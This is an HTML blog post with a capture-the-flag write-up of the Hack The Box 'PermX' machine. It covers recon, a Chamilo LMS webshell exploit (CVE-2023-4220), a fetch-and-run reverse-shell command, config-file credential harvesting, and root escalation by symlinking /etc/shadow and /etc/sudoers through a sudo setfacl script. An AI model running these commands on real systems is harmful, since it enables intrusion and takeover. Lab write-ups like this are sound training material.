@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta http-equiv="X-UA-Compatible" content="ie=edge" />
+<link rel="stylesheet" href="/_assets/main.css" />
+
+    <title>PermX - abno&#39;s blog</title>
+  <link rel="stylesheet" href="/_markdown_plugin_assets/highlight.js/atom-one-light.css" /></head>
+  <body>
+    <div class="main">
+      <nav class="navigation">
+        <a href="/">abno&#39;s blog</a>
+      </nav>
+      <article>
+        <header>
+          <h1 class="article-title">PermX</h1>
+          <div class="article-info">
+            <div>
+              <span
+                >Created At：<time datetime="1724073739393"
+                  >2024-08-19 15:22</time
+                ></span
+              >
+              <span
+                >Updated At：<time datetime="1724096254499"
+                  >2024-08-19 21:37</time
+                ></span
+              >
+            </div>
+            
+          </div>
+        </header>
+        <div class="article-content markdown-body"><h1 id="recon">Recon</h1>
+<div><pre class="hljs"><code>└──╼ $nmap -p- -A permx.htb
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-19 13:28 UTC
+Nmap scan report for permx.htb (10.129.179.162)
+Host is up (0.037s latency).
+Not shown: 65533 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 e2:5c:5d:8c:47:3e:d8:72:f7:b4:80:03:49:86:6d:ef (ECDSA)
+|_  256 1f:41:02:8e:6b:17:18:9c:a0:ac:54:23:e9:71:30:17 (ED25519)
+80/tcp open  http    Apache httpd 2.4.52
+|_http-title: eLEARNING
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre></div>
+<p><img src="/_resources/b3c9ce47fc1c47fc821ba332e748951d.png" /></p>
+<p>We can traverse whole server, but nothing interesting seems to be on it.</p>
+<p><img src="/_resources/8a552942644f4f9f8f52cc9245096c01.png" /></p>
+<div><pre class="hljs"><code>└──╼ $ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/n0kovo_subdomains.txt -u http://FUZZ.permx.htb -H "Host: FUZZ.permx.htb" -fc 302 -t 200
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://FUZZ.permx.htb
+ :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/n0kovo_subdomains.txt
+ :: Header           : Host: FUZZ.permx.htb
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 200
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response status: 302
+________________________________________________
+
+www                     [Status: 200, Size: 36182, Words: 12829, Lines: 587, Duration: 45ms]
+lms                     [Status: 200, Size: 19347, Words: 4910, Lines: 353, Duration: 7517ms]</code></pre></div>
+<p>www subdomain doesnt seem to work, but tells us something about our next subdomain.<br />
+<img src="/_resources/f267759fa49a4e39b8f5b7ecaefb6d0b.png" /></p>
+<p>And the second domain seems to be our way in.<br />
+<img src="/_resources/0b87f5b240f540bc9399ad3cf43b5fa2.png" /></p>
+<h1 id="cve-2023-4220">CVE-2023-4220</h1>
+<p>Checking as usualy for exploits, we can find <a title="https://github.com/Rai2en/CVE-2023-4220-Chamilo-LMS" href="https://github.com/Rai2en/CVE-2023-4220-Chamilo-LMS">https://github.com/Rai2en/CVE-2023-4220-Chamilo-LMS</a>.<br />
+Seems new, so maybe its not patched. Running the test script we get:</p>
+<p><img src="/_resources/a86f038d30244ca3b05e8ae0814efe23.png" /></p>
+<p>Running the exploit gives us a webshell.</p>
+<p><img src="/_resources/a6ed01ed30314327958f0fe4683ffd6d.png" /></p>
+<p><img src="/_resources/c7323e4547644594a2692540eb20dcb9.png" /></p>
+<p>We can modify the cmd var contents, so that it creates a revese shell. In burp we can send the request to repeater, modify the cmd variable to <code>wget -O - 10.10.14.81/shell.sh | bash</code>, encode it, send it and we are in.<br />
+<a title="http://lms.parmx.htb/main/inc/lib/javascript/bigupload/files/webshell.php?cmd=wget%20-O%20-%2010.10.14.81%2fshell.sh%20%7c%20bash" href="http://lms.parmx.htb/main/inc/lib/javascript/bigupload/files/webshell.php?cmd=wget%20-O%20-%2010.10.14.81%2fshell.sh%20%7c%20bash">http://lms.parmx.htb/main/inc/lib/javascript/bigupload/files/webshell.php?cmd=wget -O - 10.10.14.81%2Fshell.sh | bash</a></p>
+<p><img src="/_resources/906e0191bc93456ab04a24e5bc944c82.png" /></p>
+<p>For QoL, we can get shell stablisation.</p>
+<div><pre class="hljs"><code>python3 -c <span class="hljs-string">'import pty;pty.spawn("/bin/bash")'</span>
+<span class="hljs-built_in">export</span> TERM=xterm
+CTRL-Z
+stty raw -<span class="hljs-built_in">echo</span>; <span class="hljs-built_in">fg</span></code></pre></div>
+<h1 id="user-access">User access</h1>
+<p>From linpeas scan we can see, that there is sftp service that we can connect to localy and we know username and password for it. That may be usefull for priv esc, but for now it doesnt seem to work.</p>
+<div><pre class="hljs"><code>╔══════════╣ Analyzing Env Files (limit 70)
+-rwxr-xr-x 1 www-data www-data 326 Nov  3  2022 /var/www/chamilo/vendor/knplabs/gaufrette/.env.dist
+...
+FTP_HOST=ftp
+FTP_PORT=21
+FTP_USER=gaufrette
+FTP_PASSWORD=gaufrette
+FTP_BASE_DIR=/gaufrette
+MONGO_URI=mongodb://mongodb:27017
+MONGO_DBNAME=gridfs_test
+SFTP_HOST=sftp
+SFTP_PORT=22
+SFTP_USER=gaufrette
+SFTP_PASSWORD=gaufrette
+SFTP_BASE_DIR=gaufrette
+
+╔══════════╣ Active Ports
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp6       0      0 :::80                   :::*                    LISTEN      -                   
+tcp6       0      0 :::22                   :::*                    LISTEN      -   </code></pre></div>
+<p>For now I was searching all of the possible config files as usualy and found more interesting content.<br />
+/var/www/chamilo/app/config/configuration.php</p>
+<div><pre class="hljs"><code>...
+// Database connection settings.
+<span class="hljs-meta">$</span><span class="language-bash">_configuration[<span class="hljs-string">'db_host'</span>] = <span class="hljs-string">'localhost'</span>;</span>
+<span class="hljs-meta">$</span><span class="language-bash">_configuration[<span class="hljs-string">'db_port'</span>] = <span class="hljs-string">'3306'</span>;</span>
+<span class="hljs-meta">$</span><span class="language-bash">_configuration[<span class="hljs-string">'main_database'</span>] = <span class="hljs-string">'chamilo'</span>;</span>
+<span class="hljs-meta">$</span><span class="language-bash">_configuration[<span class="hljs-string">'db_user'</span>] = <span class="hljs-string">'chamilo'</span>;</span>
+<span class="hljs-meta">$</span><span class="language-bash">_configuration[<span class="hljs-string">'db_password'</span>] = <span class="hljs-string">'03F6lY3uXAP2bkW8'</span>;</span>
+// Enable access to database management for platform admins.
+<span class="hljs-meta">$</span><span class="language-bash">_configuration[<span class="hljs-string">'db_manager_enabled'</span>] = <span class="hljs-literal">false</span>;</span>
+...</code></pre></div>
+<p>Password seems to work for mtz, so no need to login to db.</p>
+<h1 id="priv-esc">Priv esc</h1>
+<p>Running linenum again gives us interesting information:</p>
+<div><pre class="hljs"><code>mtz@permx:/opt$ sudo -l
+Matching Defaults entries for mtz on permx:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User mtz may run the following commands on permx:
+    (ALL : ALL) NOPASSWD: /opt/acl.sh</code></pre></div>
+<p>And the content of /opt/acl.sh is:</p>
+<div><pre class="hljs"><code><span class="hljs-meta">#!/bin/bash</span>
+
+<span class="hljs-keyword">if</span> [ <span class="hljs-string">"<span class="hljs-variable">$#</span>"</span> -ne 3 ]; <span class="hljs-keyword">then</span>
+    /usr/bin/<span class="hljs-built_in">echo</span> <span class="hljs-string">"Usage: <span class="hljs-variable">$0</span> user perm file"</span>
+    <span class="hljs-built_in">exit</span> 1
+<span class="hljs-keyword">fi</span>
+
+user=<span class="hljs-string">"<span class="hljs-variable">$1</span>"</span>
+perm=<span class="hljs-string">"<span class="hljs-variable">$2</span>"</span>
+target=<span class="hljs-string">"<span class="hljs-variable">$3</span>"</span>
+
+<span class="hljs-keyword">if</span> [[ <span class="hljs-string">"<span class="hljs-variable">$target</span>"</span> != /home/mtz/* || <span class="hljs-string">"<span class="hljs-variable">$target</span>"</span> == *..* ]]; <span class="hljs-keyword">then</span>
+    /usr/bin/<span class="hljs-built_in">echo</span> <span class="hljs-string">"Access denied."</span>
+    <span class="hljs-built_in">exit</span> 1
+<span class="hljs-keyword">fi</span>
+
+<span class="hljs-comment"># Check if the path is a file</span>
+<span class="hljs-keyword">if</span> [ ! -f <span class="hljs-string">"<span class="hljs-variable">$target</span>"</span> ]; <span class="hljs-keyword">then</span>
+    /usr/bin/<span class="hljs-built_in">echo</span> <span class="hljs-string">"Target must be a file."</span>
+    <span class="hljs-built_in">exit</span> 1
+<span class="hljs-keyword">fi</span>
+
+/usr/bin/sudo /usr/bin/setfacl -m u:<span class="hljs-string">"<span class="hljs-variable">$user</span>"</span>:<span class="hljs-string">"<span class="hljs-variable">$perm</span>"</span> <span class="hljs-string">"<span class="hljs-variable">$target</span>"</span></code></pre></div>
+<p>It seems to allow us to run setfacl as root on some files.</p>
+<p>First thought was to abuse setfacl version.</p>
+<div><pre class="hljs"><code>mtz@permx:/opt$ /usr/bin/setfacl --version
+setfacl 2.3.1</code></pre></div>
+<p>There are some CVE’s, but none that I’ve menaged to use.<br />
+Then Ive focused on understanding execution restrictions and decided to bypass the localisation restriction using symlinks.</p>
+<div><pre class="hljs"><code>ln -s /etc/shadow shadow
+sudo /opt/acl.sh mtz rwx /home/mtz/shadow</code></pre></div>
+<p>It does work and allows us to inspect the shadow file.</p>
+<div><pre class="hljs"><code>mtz@permx:~$ cat shadow
+...
+root:$y$j9T$VEMcaSLaOOvSE3mYgRXRv/$tNXYdTRyCAkwoSHhlyIoCS91clvPEp/hh0r4NTBlmS7:19742:0:99999:7:::
+mtz:$y$j9T$RUjBgvOODKC9hyu5u7zCt0$Vf7nqZ4umh3s1N69EeoQ4N5zoid6c2SlGb1LvBFRxSB:19742:0:99999:7:::
+...</code></pre></div>
+<p>I could not decrypt it, so ive tried a different approach.</p>
+<div><pre class="hljs"><code>mtz@permx:~$ ln -s /etc/sudoers /home/mtz/sudoers
+mtz@permx:~$ sudo /opt/acl.sh mtz rw /home/mtz/sudoers
+mtz@permx:~$ echo "mtz ALL=(ALL:ALL) NOPASSWD: ALL" &gt;&gt; sudoers 
+mtz@permx:~$ sudo su</code></pre></div>
+<p>And got the root flag.</p>
+</div>
+      </article>
+    </div>
+  </body>
+</html>
